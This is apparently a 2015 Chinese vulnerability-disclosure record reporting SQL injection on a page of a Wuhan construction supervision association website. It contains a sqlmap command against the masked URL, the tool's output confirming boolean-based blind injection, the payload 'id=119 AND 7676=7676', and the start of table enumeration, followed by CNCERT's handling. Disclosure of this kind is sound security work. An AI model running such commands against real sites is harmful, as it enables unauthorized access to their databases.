wybug_title: 武汉建设监理协会某页面存在SQL注射-第二枚
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-09-04：	细节已通知厂商并且等待厂商处理中									2015-09-07：	cncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开									2015-09-17：	细节向核心白帽子及相关领域专家公开									2015-09-27：	细节向普通白帽子公开									2015-10-07：	细节向实习白帽子公开									2015-10-22：	细节向公众公开  简要描述： RT 详细说明：  sqlsql:
python sqlmap.py -u "http://**.**.**.**/ind_qyyj.asp?id=119" --table
得出:
[00:16:22] [INFO] testing connection to the target url[00:16:24] [INFO] testing if the url is stable, wait a few seconds[00:16:25] [INFO] url is stable[00:16:25] [INFO] testing if GET parameter 'id' is dynamic[00:16:25] [INFO] confirming that GET parameter 'id' is dynamic[00:16:25] [INFO] GET parameter 'id' is dynamic[00:16:25] [WARNING] reflective value(s) found and filtering out[00:16:25] [WARNING] heuristic test shows that GET parameter 'id' might not be injectable[00:16:25] [INFO] testing for SQL injection on GET parameter 'id'[00:16:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[00:16:30] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable [00:16:30] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[00:16:30] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[00:16:31] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[00:16:32] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[00:16:33] [INFO] testing 'MySQL > 5.0.11 stacked queries'[00:16:35] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[00:16:36] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[00:16:37] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[00:16:38] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[00:16:39] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[00:16:39] [INFO] testing 'Oracle AND time-based blind'[00:16:42] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[00:16:42] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other injection technique found[00:17:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[00:17:01] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using the --dbms option[00:17:20] [INFO] checking if the injection point on GET parameter 'id' is a false positiveGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 62 HTTP(s) requests:
成功注射:
---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=119 AND 7676=7676---[00:17:28] [INFO] testing MySQL[00:17:28] [WARNING] the back-end DBMS is not MySQL[00:17:28] [INFO] testing Oracle[00:17:29] [WARNING] the back-end DBMS is not Oracle[00:17:29] [INFO] testing PostgreSQL[00:17:30] [WARNING] the back-end DBMS is not PostgreSQL[00:17:30] [INFO] testing Microsoft SQL Server[00:17:30] [WARNING] the back-end DBMS is not Microsoft SQL Server[00:17:30] [INFO] testing SQLite[00:17:32] [WARNING] the back-end DBMS is not SQLite[00:17:32] [INFO] testing Microsoft Access[00:17:33] [INFO] confirming Microsoft Access[00:17:33] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[00:17:33] [INFO] fetching tables for database: 'Microsoft_Access_masterdb'[00:17:33] [INFO] fetching number of tables for database 'Microsoft_Access_masterdb'[00:17:33] [WARNING] running in a single-thread mode. wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-09-07 08:40 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给湖北分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
